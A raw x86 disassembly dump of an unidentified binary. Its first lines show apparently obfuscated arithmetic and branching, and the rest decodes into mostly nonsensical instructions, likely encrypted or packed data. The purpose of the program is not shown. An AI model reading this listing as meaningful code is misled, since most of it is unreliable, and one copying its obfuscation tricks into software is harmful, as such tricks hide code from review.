  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	stc    
  41424d:	push   edi
  41424e:	inc    edx
  41424f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414250:	jge    0x414298
  414252:	popa   
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	or     al,0x36
  41425a:	hlt    
  41425b:	fisttp DWORD PTR [esi+0x44]
  41425e:	fld    QWORD PTR [eax]
  414260:	or     esp,DWORD PTR [ebp-0x4a]
  414263:	sar    BYTE PTR [edi],cl
  414265:	repnz inc ebp
  414267:	(bad)  
  414268:	mov    dh,0x85
  41426a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41426b:	add    bh,BYTE PTR [ebp+0x58]
  41426e:	sahf   
  41426f:	retf   0xcb70
  414272:	sar    BYTE PTR [eax],0xae
  414275:	inc    esi
  414276:	adc    BYTE PTR [eax-0x5aabc097],ah
  41427c:	xchg   DWORD PTR [eax],edx
  41427e:	neg    DWORD PTR [esp+ecx*8+0x6a175d35]
  414285:	xor    ebp,DWORD PTR [eax-0x35]
  414288:	xor    DWORD PTR [eax+0x53],ecx
  41428b:	jp     0x4142f6
  41428d:	jmp    0x2ee4bc7d
  414292:	cmp    ecx,edx
  414294:	xchg   edx,eax
  414295:	mov    ebp,0xa23bf3af
  41429a:	popa   
  41429b:	sub    al,0xdd
  41429d:	js     0x414296
  41429f:	adc    DWORD PTR [esi-0x331b41c3],0x929220d3
  4142a9:	mov    ecx,0xc79a4582
  4142ae:	test   ecx,0xd7d3c9cd
  4142b4:	cmp    BYTE PTR [eax],0xeb
  4142b7:	cld    
  4142b8:	pushf  
  4142b9:	dec    esp
  4142ba:	fs inc ebx
  4142bc:	scas   eax,DWORD PTR es:[edi]
  4142bd:	mov    ebx,0x98e5770
  4142c2:	dec    ebx
  4142c3:	add    dl,BYTE PTR [edx]
  4142c5:	mov    esp,0x3fbefaec
  4142ca:	pop    esp
  4142cb:	in     al,0x0
  4142cd:	push   ds
  4142ce:	mov    dl,0x1f
  4142d0:	xchg   edi,eax
  4142d1:	mov    bl,0xb
  4142d3:	cmp    BYTE PTR [ecx+ebx*4+0x1a41ddba],dh
  4142da:	adc    BYTE PTR [ebp-0x61],dl
  4142dd:	sahf   
  4142de:	dec    edx
  4142df:	gs dec ebp
  4142e1:	sub    eax,0x3ff71df5
  4142e6:	jnp    0x41428c
  4142e8:	data16 ins BYTE PTR es:[edi],dx
  4142ea:	sub    eax,0xa8176435
  4142ef:	(bad)  
  4142f0:	call   0xfcd3:0xb8749e2c
  4142f7:	ins    BYTE PTR es:[edi],dx
  4142f8:	cmp    BYTE PTR [edx+ebp*1+0x14],dh
  4142fc:	stos   DWORD PTR es:[edi],eax
  4142fd:	lods   eax,DWORD PTR ds:[esi]
  4142fe:	mov    ecx,0x12b93218
  414303:	dec    edx
  414304:	sti    
  414305:	cmp    cl,0x7f
  414308:	aas    
  414309:	inc    esp
  41430a:	add    eax,0xe438aa2f
  41430f:	sbb    eax,0x2534b3eb
  414314:	ja     0x414376
  414316:	lahf   
  414317:	inc    edi
  414318:	dec    ebp
  414319:	cs mov bl,0x88
  41431c:	mov    bl,BYTE PTR [esi+0x25]
  41431f:	in     al,dx
  414320:	mov    ch,0x7
  414322:	lahf   
  414323:	sbb    eax,0xb812f1c1
  414328:	cs jge 0x41438b
  41432b:	inc    esi
  41432c:	mov    ch,0x82
  41432e:	sahf   
  41432f:	call   0x4261c905
  414334:	(bad)  
  414335:	push   0xffffffdc
  414337:	pop    esp
  414338:	pushf  
  414339:	push   ecx
  41433a:	inc    eax
  41433b:	lods   al,BYTE PTR ds:[esi]
  41433c:	pop    eax
  41433d:	adc    DWORD PTR [ebp+0x45],esp
  414340:	call   0xf9d9:0x5d3cfb1
  414347:	loop   0x414395
  414349:	mov    ds:0x2579a64e,eax
  41434e:	ret    0x213f
  414351:	xchg   BYTE PTR [edx+0x26],cl
  414354:	mov    eax,0x1679df34
  414359:	sub    ebx,esi
  41435b:	pop    edi
  41435c:	mov    esp,0xe118b825
  414361:	mov    ah,0x92
  414363:	into   
  414364:	outs   dx,DWORD PTR ds:[esi]
  414365:	(bad)  
  414366:	cld    
  414367:	hlt    
  414368:	jb     0x4143cc
  41436a:	add    ch,BYTE PTR [ebx+eax*2]
  41436d:	cdq    
  41436e:	imul   esi,DWORD PTR [ebx],0xa74b3afe
  414374:	dec    ebx
  414375:	add    BYTE PTR [edi+esi*4+0x1b0fb96],al
  41437c:	mov    WORD PTR [edi-0x6d494abc],ss
  414382:	or     DWORD PTR [edi+edi*1+0x1c],0x65bde809
  41438a:	das    
  41438b:	push   cs
  41438c:	mov    ds:0x5349aa4a,al
  414391:	mov    dh,0xd5
  414393:	inc    ebp
  414394:	xchg   esi,eax
  414395:	push   es
  414396:	sbb    ecx,ebp
  414398:	jl     0x41435d
  41439a:	retf   0x6f2b
  41439d:	jle    0x4143c7
  41439f:	sbb    DWORD PTR [edx+0x3b],esi
  4143a2:	xchg   edx,eax
  4143a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143a4:	std    
  4143a5:	xchg   ebx,eax
  4143a6:	ja     0x414337
  4143a8:	dec    edx
  4143a9:	add    ah,BYTE PTR [ecx+0x2fde887d]
  4143af:	test   DWORD PTR [edx+0x2832d38a],0xac44076b
  4143b9:	xor    DWORD PTR [edx+0x7a2cda21],ecx
  4143bf:	dec    edx
  4143c0:	dec    ebp
  4143c1:	push   0x17a2f2d0
  4143c6:	or     eax,0x7a41073
  4143cb:	or     eax,DWORD PTR [edi]
  4143cd:	add    ecx,DWORD PTR [ebx]
  4143cf:	sbb    al,0x9b
  4143d1:	dec    esi
  4143d2:	sub    esi,DWORD PTR ds:0x1ecb954c
  4143d8:	xor    eax,DWORD PTR [edx-0x14e23ce3]
  4143de:	fisttp QWORD PTR fs:[edi]
  4143e1:	icebp  
  4143e2:	ror    DWORD PTR [ecx+0x5903ea50],0x41
  4143e9:	fild   QWORD PTR [edi-0x40]
  4143ec:	dec    esi
  4143ed:	shr    DWORD PTR [ecx-0xa],0xd4
  4143f1:	gs jmp 0x41445e
  4143f4:	rcl    BYTE PTR [ebx+0x53e40d1b],cl
  4143fa:	pop    esp
  4143fb:	push   ss
  4143fc:	push   ebp
  4143fd:	dec    eax
  4143fe:	call   0x7bade843
  414403:	push   0xffffffcb
  414405:	js     0x414474
  414407:	push   esi
  414408:	outs   dx,BYTE PTR ds:[esi]
  414409:	jae    0x4143f6
  41440b:	inc    esi
  41440c:	adc    al,0xf9
  41440e:	in     eax,dx
  41440f:	das    
  414410:	mov    bh,0x3e
  414412:	outs   dx,DWORD PTR ds:[esi]
  414413:	or     eax,0x149068e0
  414418:	cmp    esi,ebx
  41441a:	or     eax,0x247efbba
  41441f:	xor    al,0xcf
  414421:	xor    ebx,esi
  414423:	xor    al,0xd3
  414425:	inc    ecx
  414426:	mov    al,ds:0x90287933
  41442b:	fidivr WORD PTR [eax+0x75e0c625]
  414431:	popa   
  414432:	dec    ecx
  414433:	add    eax,0xa5e399e6
  414438:	lahf   
  414439:	sub    eax,0xfe51d9f
  41443e:	xlat   BYTE PTR ds:[ebx]
  41443f:	(bad)  
  414440:	cmp    BYTE PTR [edx-0x1a52a2ea],ch
  414446:	cwde   
  414447:	movaps XMMWORD PTR [esp+esi*8],xmm4
  41444b:	mov    bl,0xe4
  41444d:	mov    bl,0xce
  41444f:	xor    DWORD PTR [ebp+0x7b],ebx
  414452:	and    eax,0x3bc4f076
  414457:	mov    edx,0xb1976ab
  41445c:	aaa    
  41445d:	cmp    BYTE PTR [ebx],ah
  41445f:	sbb    eax,0x77cd5277
  414464:	(bad)  
  414465:	mov    bh,0x6f
  414467:	jmp    0xd6dbda72
  41446c:	popf   
  41446d:	jmp    FWORD PTR [ecx]
  41446f:	push   eax
  414470:	popf   
  414471:	ror    BYTE PTR [ecx+0x28],cl
  414474:	pop    ss
  414475:	xchg   edx,eax
  414476:	loope  0x41445f
  414478:	fmul   DWORD PTR [edi-0x51]
  41447b:	xchg   BYTE PTR [ecx+0x2d],dl
  41447e:	mov    DWORD PTR [edx],ebx
  414480:	ret    
  414481:	sbb    DWORD PTR [ebp+esi*1-0x1b],edx
  414485:	add    eax,0x5f2492ba
  41448a:	mov    ch,0x56
  41448c:	cmp    eax,0x1141eb32
  414491:	ja     0x4144fc
  414493:	mov    ah,0x9f
  414495:	ror    BYTE PTR [ebp-0x64685bb9],0x77
  41449c:	push   ebx
  41449d:	jb     0x4144d3
  41449f:	sahf   
  4144a0:	ret    
  4144a1:	add    al,0xd7
  4144a3:	(bad)  
  4144a4:	xchg   BYTE PTR [ebp-0x33],ch
  4144a7:	cmp    DWORD PTR [edi+0x31cbecfa],eax
  4144ad:	jle    0x414436
  4144af:	fld    TBYTE PTR ds:0x8c3f8774
  4144b5:	addr16 mov eax,0x9d99cb65
  4144bb:	call   0x935c7fcb
  4144c0:	sar    cl,cl
  4144c2:	scas   eax,DWORD PTR es:[edi]
  4144c3:	(bad)  
  4144c4:	sub    DWORD PTR ds:0xe6f1df30,ebp
  4144ca:	push   ss
  4144cb:	sub    DWORD PTR [eax],ecx
  4144cd:	mov    DWORD PTR [ecx+0x1c],ebp
  4144d0:	jge    0x414535
  4144d2:	mov    ebx,0xf6c5f681
  4144d7:	or     edx,0xc2d083cc
  4144dd:	cmp    cl,cl
  4144df:	adc    al,0x2a
  4144e1:	aas    
  4144e2:	shl    DWORD PTR [ebp-0x17],1
  4144e5:	jle    0x41453f
  4144e7:	fwait
  4144e8:	xor    dl,al
  4144ea:	adc    DWORD PTR [ebp-0x3c],0x1618ab05
  4144f1:	fmulp  st(2),st
  4144f3:	push   ecx
  4144f4:	xlat   BYTE PTR ds:[ebx]
  4144f5:	push   ebp
  4144f6:	fucomp st(5)
  4144f8:	jae    0x41450f
  4144fa:	cmp    al,0x1a
  4144fc:	or     ch,bl
  4144fe:	add    DWORD PTR [esi+ecx*2+0xc],edx
  414502:	dec    ecx
  414503:	push   edx
  414504:	mov    dh,0x74
  414506:	cmc    
  414507:	enter  0x755b,0x4e
  41450b:	pop    esi
  41450c:	lods   al,BYTE PTR ds:[esi]
  41450d:	mov    cl,bh
  41450f:	fld    DWORD PTR [esi]
  414511:	enter  0xe6f,0x41
  414515:	cdq    
  414516:	sar    DWORD PTR [ebp+0x10ddda5e],cl
  41451c:	loopne 0x4144d5
  41451e:	and    ebx,DWORD PTR [ebx]
  414520:	cdq    
  414521:	fnstcw WORD PTR [ebx-0x19a66243]
  414527:	dec    edi
  414528:	or     bp,bx
  41452b:	mov    al,0x67
  41452d:	out    0x9f,eax
  41452f:	mov    bh,0x91
  414531:	sbb    BYTE PTR [esi+ebp*8],dh
  414534:	mov    ch,0xc4
  414536:	out    dx,eax
  414537:	inc    esi
  414538:	mov    WORD PTR [eax],cs
  41453a:	std    
  41453b:	or     ah,BYTE PTR [edi]
  41453d:	loopne 0x41451e
  41453f:	in     eax,0xe4
  414541:	fwait
  414542:	lods   eax,DWORD PTR ds:[esi]
  414543:	ins    DWORD PTR es:[edi],dx
  414544:	fimul  DWORD PTR [edi]
  414546:	aad    0x1f
  414548:	adc    BYTE PTR [esp+eax*1],dh
  41454b:	or     DWORD PTR [eax+0x29],eax
  41454e:	call   0x69e7:0x3e7d869b
  414555:	lgs    ebx,FWORD PTR [ecx+0x2e]
  414559:	cli    
  41455a:	inc    esi
  41455b:	mov    ch,0x7b
  41455d:	adc    al,0xbf
  41455f:	int    0xf8
  414561:	lods   eax,DWORD PTR ds:[esi]
  414562:	pushf  
  414563:	pop    eax
  414564:	aam    0x29
  414566:	clc    
  414567:	sub    BYTE PTR [ebx],0x57
  41456a:	or     al,0xdc
  41456c:	inc    esp
  41456d:	inc    esp
  41456e:	inc    ebx
  41456f:	stos   BYTE PTR es:[edi],al
  414570:	mov    BYTE PTR [esi-0x2c044a40],bl
  414576:	jb     0x41452f
  414578:	ins    BYTE PTR es:[edi],dx
  414579:	lock mov DWORD PTR [edi],esi
  41457c:	mov    fs,ebp
  41457e:	fsubr  st(1),st
  414580:	fdiv   st(7),st
  414582:	call   0x6c8a:0x5412da6b
  414589:	(bad)  [ebp-0x40]
  41458c:	xchg   edx,eax
  41458d:	jbe    0x4145b6
  41458f:	sbb    eax,0xe3bf8a3d
  414594:	push   es
  414595:	pop    eax
  414596:	data16 jne 0x4145d4
  414599:	mov    bh,bl
  41459b:	arpl   di,sp
  41459d:	push   eax
  41459e:	sub    DWORD PTR [edx+ebp*8+0x26],ecx
  4145a2:	sub    BYTE PTR [eax],dh
  4145a4:	gs int3 
  4145a6:	pop    edx
  4145a7:	sub    ebp,eax
  4145a9:	shl    DWORD PTR [edi-0x4d336184],1
  4145af:	fucomi st,st(3)
  4145b1:	inc    ebp
  4145b2:	jb     0x4145f2
  4145b4:	cli    
  4145b5:	sti    
  4145b6:	scas   al,BYTE PTR es:[edi]
  4145b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145b8:	mov    ah,0xa2
  4145ba:	sbb    eax,0x7474ba23
  4145bf:	(bad)  
  4145c0:	iret   
  4145c1:	std    
  4145c2:	jge    0x414570
  4145c4:	(bad)  
  4145c5:	fwait
  4145c6:	cwde   
  4145c7:	fcomp  st(1)
  4145c9:	mov    ch,0x6f
  4145cb:	bound  ebx,QWORD PTR [ecx+0x473ccb14]
  4145d1:	push   ebx
  4145d2:	fadd   DWORD PTR [ebp-0x64]
  4145d5:	div    DWORD PTR [edi-0x1e]
  4145d8:	ret    0xcd41
  4145db:	or     esp,edi
  4145dd:	repnz xlat BYTE PTR ds:[ebx]
  4145df:	pop    esi
  4145e0:	sub    edx,DWORD PTR fs:[esi-0xb1553ce]
  4145e7:	shl    dl,0xc5
  4145ea:	ds cld 
  4145ec:	clc    
  4145ed:	cmp    eax,0xf13683aa
  4145f2:	push   ebx
  4145f3:	push   ss
  4145f4:	data16 mov WORD PTR [edx+0x2c],es
  4145f8:	test   ecx,ebx
  4145fa:	sub    ebp,DWORD PTR [edx]
  4145fc:	fs mov edx,0x3464911a
  414602:	xchg   ebp,eax
  414603:	icebp  
  414604:	jmp    0x4145e6
  414606:	inc    eax
  414607:	dec    eax
  414608:	pop    ebp
  414609:	mov    edx,0xbedf835d
  41460e:	fisubr WORD PTR ds:0x397cdf13
  414614:	mov    bh,0x5b
  414616:	imul   ebp,DWORD PTR [edi],0x3e
  414619:	pop    esi
  41461a:	test   al,0x67
  41461c:	pushf  
  41461d:	stc    
  41461e:	xchg   ecx,eax
  41461f:	add    BYTE PTR [ecx+ebx*2+0x59],bl
  414623:	out    0x19,al
  414625:	xor    dl,BYTE PTR [edi]
  414627:	aaa    
  414628:	lods   eax,DWORD PTR ds:[esi]
  414629:	fwait
  41462a:	scas   al,BYTE PTR es:[edi]
  41462b:	pushf  
  41462c:	retf   
  41462d:	dec    esp
  41462e:	cld    
  41462f:	push   ss
  414630:	and    al,0xd2
  414632:	xchg   esi,eax
  414633:	lds    ebx,FWORD PTR [edi+0x2f]
  414636:	mov    eax,0x1bb7f4e5
  41463b:	inc    ecx
  41463c:	shl    BYTE PTR [edx+0x45],1
  41463f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414640:	adc    eax,0xfa8209d1
  414645:	test   al,0x68
  414647:	shr    DWORD PTR [ecx+0x3821157f],0xfa
  41464e:	pop    esp
  41464f:	(bad)  
  414651:	(bad)  [ecx]
  414653:	lea    ecx,gs:0xe2bbfa9c
  41465a:	pop    esp
  41465b:	enter  0x5e9,0x95
  41465f:	mov    ebp,DWORD PTR [esi]
  414661:	push   es
  414662:	jmp    0xa8e3997
  414667:	ins    DWORD PTR es:[edi],dx
  414668:	int3   
  414669:	jle    0x414651
  41466b:	xor    DWORD PTR [ebp-0xadb217d],ecx
  414671:	data16 cmp al,0x2f
  414674:	and    DWORD PTR [esi],ebp
  414676:	xor    eax,0x107c1cb
  41467b:	and    esp,DWORD PTR [esi]
  41467d:	in     al,0x23
  41467f:	in     al,dx
  414680:	xlat   BYTE PTR ds:[ebx]
  414681:	sbb    ch,BYTE PTR [ebp-0x50c87da0]
  414687:	fwait
  414688:	rol    BYTE PTR [edx],0x75
  41468b:	stos   BYTE PTR es:[edi],al
  41468c:	jb     0x4146a4
  41468e:	push   esi
  41468f:	fisttp WORD PTR ds:0x8589447c
  414695:	sbb    BYTE PTR [edi-0x3e],0xb8
  414699:	inc    ecx
  41469a:	in     al,0xe2
  41469c:	rcl    BYTE PTR [ebx-0x21],1
  41469f:	fs mov bl,0xe2
  4146a2:	ins    BYTE PTR es:[edi],dx
  4146a3:	jmp    0x26e87b1b
  4146a8:	mov    ah,0x73
  4146aa:	sar    BYTE PTR ss:[ebx+0x4cf63d8b],cl
  4146b1:	fwait
  4146b2:	jecxz  0x4146a6
  4146b4:	mov    eax,0x905e6580
  4146b9:	cmc    
  4146ba:	pop    ss
  4146bb:	push   cs
  4146bc:	psubw  mm4,mm7
  4146bf:	aad    0x96
  4146c1:	cs leave 
  4146c3:	push   esp
  4146c4:	or     al,BYTE PTR [ebx+0x2f]
  4146c7:	mov    ds:0xf4cb168e,eax
  4146cc:	adc    eax,0x8d471cf0
  4146d1:	idiv   ebx
  4146d3:	mov    WORD PTR [eax],?
  4146d5:	push   ebx
  4146d6:	inc    ecx
  4146d7:	pop    ebp
  4146d8:	je     0x4146de
  4146da:	clc    
  4146db:	jb     0x41469e
  4146dd:	into   
  4146de:	(bad)  
  4146e0:	(bad)  
  4146e1:	addr16 mov al,0x9b
  4146e4:	xor    BYTE PTR [eax+edi*1+0x30da6840],ah
  4146eb:	outs   dx,BYTE PTR ds:[esi]
  4146ec:	inc    edi
  4146ed:	test   al,0xcb
  4146ef:	jbe    0x4146e5
  4146f1:	push   ebp
  4146f2:	jbe    0x414685
  4146f4:	sub    al,0xfa
  4146f6:	aad    0xc0
  4146f8:	fwait
  4146f9:	ins    DWORD PTR es:[edi],dx
  4146fa:	or     DWORD PTR [edi-0x38],eax
  4146fd:	jb     0x4146f2
  4146ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414700:	jp     0x4146d4
  414702:	pop    es
  414703:	out    0xdc,eax
  414705:	inc    esi
  414706:	lea    esp,[edi+0x105bb4bb]
  41470c:	ret    0xafeb
  41470f:	gs aaa 
  414711:	int3   
  414712:	adc    ch,BYTE PTR [ebx+0x6d47fa3d]
  414718:	or     BYTE PTR [ebx+0x70],ch
  41471b:	mov    ds:0xa9cca05,al
  414720:	lds    edi,FWORD PTR [edi-0x6f]
  414723:	adc    al,BYTE PTR [ebx+0x4c]
  414726:	aas    
  414727:	add    DWORD PTR ds:[ecx+0xe9c2430],0x3a323fc3
  414732:	inc    ebx
  414733:	ins    DWORD PTR es:[edi],dx
  414734:	adc    DWORD PTR [eax],ebp
  414736:	cs pusha 
  414738:	jl     0x41476b
  41473a:	pop    es
  41473b:	push   ss
  41473c:	fs mov bl,0xb4
  41473f:	sub    eax,0x1d7c07a8
  414744:	outs   dx,DWORD PTR ds:[esi]
  414745:	xchg   ebp,eax
  414746:	or     esi,esi
  414748:	and    eax,0xf0c2ab0f
  41474d:	push   ds
  41474e:	mov    ecx,0x4ce4e5aa
  414753:	ins    BYTE PTR es:[edi],dx
  414754:	sub    dh,bh
  414756:	int3   
  414757:	in     al,dx
  414758:	jl     0x4147bf
  41475a:	sub    dh,BYTE PTR [eax-0x37]
  41475d:	xor    edx,eax
  41475f:	push   esi
  414760:	and    al,0x79
  414762:	ss ins BYTE PTR es:[edi],dx
  414764:	dec    BYTE PTR [ecx+esi*2+0x4db521c3]
  41476b:	sbb    eax,0xb60d0d3d
  414770:	dec    esi
  414771:	rcl    DWORD PTR [ecx-0x78],cl
  414774:	inc    esi
  414775:	dec    eax
  414776:	call   0x37fd:0x4dc63067
  41477d:	imul   eax,esp,0xa41c8216
  414783:	pop    eax
  414784:	jno    0x4147e8
  414786:	sbb    eax,DWORD PTR [ebp-0x31]
  414789:	arpl   WORD PTR [esi-0x1f],sp
  41478c:	int3   
  41478d:	pusha  
  41478e:	(bad)  
  41478f:	loop   0x4147a8
  414791:	in     al,0x26
  414793:	call   0x863110f0
  414798:	repnz data16 int 0x52
  41479c:	adc    DWORD PTR [edx-0x3],edx
  41479f:	retf   0xb56c
  4147a2:	js     0x414759
  4147a4:	(bad)  
  4147a5:	cmp    al,0x88
  4147a7:	mov    DWORD PTR [esi-0x7b1d79de],edi
  4147ad:	sbb    dh,BYTE PTR [ecx-0x587a3ee4]
  4147b3:	mov    al,ds:0xbdb6f640
  4147b8:	pop    eax
  4147b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147ba:	ret    0xc32f
  4147bd:	sti    
  4147be:	xor    dl,cl
  4147c0:	mov    ebx,edi
  4147c2:	(bad)  
  4147c3:	cmp    esp,DWORD PTR [ecx+edx*8]
  4147c6:	push   ebp
  4147c7:	xchg   esi,eax
  4147c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147c9:	int    0x1a
  4147cb:	imul   ebx,DWORD PTR [esi],0xffd027d
  4147d1:	clc    
  4147d2:	pop    ss
  4147d3:	in     eax,0xcb
  4147d5:	bound  ebp,QWORD PTR [eax+eiz*1]
  4147d8:	pop    ds
  4147d9:	aad    0x67
  4147db:	fdiv   QWORD PTR [ecx+esi*1]
  4147de:	push   ss
  4147df:	or     DWORD PTR [edx+edi*1],edx
  4147e2:	mov    al,0x9c
  4147e4:	sbb    eax,0x4ab70a7
  4147e9:	cmc    
  4147ea:	ins    BYTE PTR es:[edi],dx
  4147eb:	int    0x8c
  4147ed:	or     BYTE PTR [eax],bh
  4147ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147f0:	inc    ebx
  4147f1:	add    eax,0x496957d0
  4147f6:	xlat   BYTE PTR ds:[ebx]
  4147f7:	in     al,0xab
  4147f9:	fadd   st(4),st
  4147fb:	imul   edx,ebx,0xca9c83ad
  414801:	cmp    al,0x33
  414803:	xor    DWORD PTR [edi+0x35],esp
  414806:	outs   dx,BYTE PTR ds:[esi]
  414807:	mov    esp,0x80b55aed
  41480c:	mov    ds:0x10371f85,eax
  414811:	xchg   ebx,eax
  414812:	or     BYTE PTR [ecx],0xf1
  414815:	pop    esi
  414816:	imul   esi,DWORD PTR [eax+0x311cfd61],0x386dd202
  414820:	jmp    0x4a096159
  414825:	push   esp
  414826:	jge    0x414874
  414828:	xor    DWORD PTR [eax],esi
  41482a:	nop
  41482b:	div    esp
  41482d:	and    BYTE PTR [ebx+ebp*8-0x284e701a],bl
  414834:	sub    eax,0x85d42c95
  414839:	mov    ah,0xdc
  41483b:	daa    
  41483c:	sahf   
  41483d:	shl    DWORD PTR [ebx-0x7f12a29b],1
  414843:	fsub   st,st(5)
  414845:	or     BYTE PTR [edx+0x64],dh
  414848:	add    dl,cl
  41484a:	test   BYTE PTR [edx+0x50],al
  41484d:	xchg   ecx,eax
  41484e:	mov    ebx,0x576b41a1
  414853:	cmp    eax,0x6503d0b
  414858:	in     eax,dx
  414859:	push   cs
  41485a:	xlat   BYTE PTR ds:[ebx]
  41485b:	or     eax,DWORD PTR [ebx-0x132aa004]
  414861:	cmp    eax,DWORD PTR [esi+0x5e]
  414864:	dec    edi
  414865:	adc    esi,DWORD PTR ds:0x57d94571
  41486b:	add    eax,0x62e3fa5d
  414870:	ins    BYTE PTR es:[edi],dx
  414871:	stos   BYTE PTR es:[edi],al
  414872:	jae    0x4148d3
  414874:	inc    eax
  414875:	inc    ecx
  414876:	loope  0x414871
  414878:	xchg   BYTE PTR [ecx-0x36],al
  41487b:	scas   eax,DWORD PTR es:[edi]
  41487c:	std    
  41487d:	jmp    edx
  41487f:	mov    edx,0xef3382d1
  414884:	in     al,dx
  414885:	ins    DWORD PTR es:[edi],dx
  414886:	push   ds
  414887:	mov    al,0x61
  414889:	jbe    0x414810
  41488b:	jl     0x4148d6
  41488d:	jmp    0x7089f509
  414892:	lea    esi,[ebx+0x7b]
  414895:	mov    edx,0xcc373e91
  41489a:	stos   BYTE PTR es:[edi],al
  41489b:	ins    DWORD PTR es:[edi],dx
  41489c:	test   al,0xab
  41489e:	jp     0x4148f3
  4148a0:	test   al,0x0
  4148a2:	icebp  
  4148a3:	pop    edx
  4148a4:	jns    0x4148f6
  4148a6:	mov    ebp,0xabe73c93
  4148ab:	popa   
  4148ac:	call   0xa6d5:0x3e516b59
  4148b3:	ins    BYTE PTR es:[edi],dx
  4148b4:	mov    cl,0x97
  4148b6:	dec    ebx
  4148b7:	adc    BYTE PTR [edx+0xe5e3d79],bl
  4148bd:	cmp    bh,BYTE PTR [eax]
  4148bf:	mov    al,0xd3
  4148c1:	push   eax
  4148c2:	inc    ebp
  4148c3:	mov    ds:0xa91ea4e8,al
  4148c8:	stc    
  4148c9:	js     0x4148b4
  4148cb:	mov    al,ds:0x1a7ffa36
  4148d0:	xchg   ebp,eax
  4148d1:	hlt    
  4148d2:	push   esi
  4148d3:	push   esp
  4148d4:	cmp    DWORD PTR [esi],0x2ab81bf4
  4148da:	std    
  4148db:	push   edi
  4148dc:	loopne 0x41488e
  4148de:	add    ax,0x64de
  4148e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148e3:	inc    edx
  4148e4:	add    DWORD PTR [ecx],esp
  4148e6:	aaa    
  4148e7:	hlt    
  4148e8:	mov    ebp,0x29b52968
  4148ed:	jnp    0x414883
  4148ef:	adc    cl,BYTE PTR [eax-0x3c5dd4c1]
  4148f5:	adc    al,0x4a
  4148f7:	leave  
  4148f8:	mov    cl,0xfe
  4148fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148fb:	xor    ebx,0xffffffdc
  4148fe:	mov    esi,0xbfccb5c8
  414903:	jno    0x41496e
  414905:	adc    bh,bh
  414907:	nop
  414908:	dec    edx
  414909:	sbb    dh,BYTE PTR [edx+0x78]
  41490c:	xor    al,0x22
  41490e:	fcom   QWORD PTR [esi]
  414910:	aaa    
  414911:	push   0x41120aa1
  414916:	in     al,dx
  414917:	mov    eax,0x2bfb0426
  41491c:	test   eax,0xc27125a6
  414921:	scas   eax,DWORD PTR es:[edi]
  414922:	neg    BYTE PTR [ecx-0x6c97d11b]
  414928:	pop    ds
  414929:	stc    
  41492a:	xor    eax,0x1ed158b6
  41492f:	fcmovnbe st,st(5)
  414931:	lahf   
  414932:	mov    ch,0xb6
  414934:	sub    BYTE PTR [esi-0x5eb717e8],0x76
  41493b:	ret    0x42fa
  41493e:	bound  ebx,QWORD PTR [ebp-0x5936087f]
  414944:	fimul  WORD PTR ds:0x418ee7da
  41494a:	std    
  41494b:	xor    eax,0xe67b9766
  414950:	lock mov cl,0xc8
  414953:	jb     0x41496b
  414955:	pop    ebx
  414956:	sbb    cl,0x23
  414959:	inc    esp
  41495a:	or     al,0x90
  41495c:	sub    esp,DWORD PTR [ecx-0x593c620e]
  414962:	inc    edx
  414963:	stos   BYTE PTR es:[edi],al
  414964:	loop   0x4149ab
  414966:	dec    edx
  414967:	nop
  414968:	arpl   WORD PTR [eax+0x6d],ax
  41496b:	mov    DWORD PTR [ebp+0xa],0x9a3bf0ce
  414972:	sub    ax,0x3310
  414976:	loop   0x4149f1
  414978:	imul   edi,eax,0x3f6a0d78
  41497e:	aaa    
  41497f:	in     al,0x82
  414981:	stos   BYTE PTR es:[edi],al
  414982:	jo     0x41495f
  414984:	outs   dx,BYTE PTR ds:[esi]
  414985:	adc    ah,BYTE PTR [edi+0x377329cb]
  41498b:	and    eax,DWORD PTR [edi]
